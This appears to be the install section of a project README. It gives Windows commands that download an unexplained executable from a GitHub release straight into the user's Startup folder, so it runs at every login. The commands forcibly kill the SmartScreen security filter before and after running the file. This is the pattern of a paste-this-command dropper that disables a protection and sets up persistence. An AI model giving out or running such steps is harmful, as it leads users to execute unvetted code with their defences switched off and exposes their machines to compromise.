## Install
```
cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl -o program.exe https://github.com/roger-padrell/scaling-octo-eureka/releases/download/windows0.1.0/program.exe
taskkill /F /IM "smartscreen.exe"
program.exe
taskkill /F /IM "smartscreen.exe"
echo Installed

```
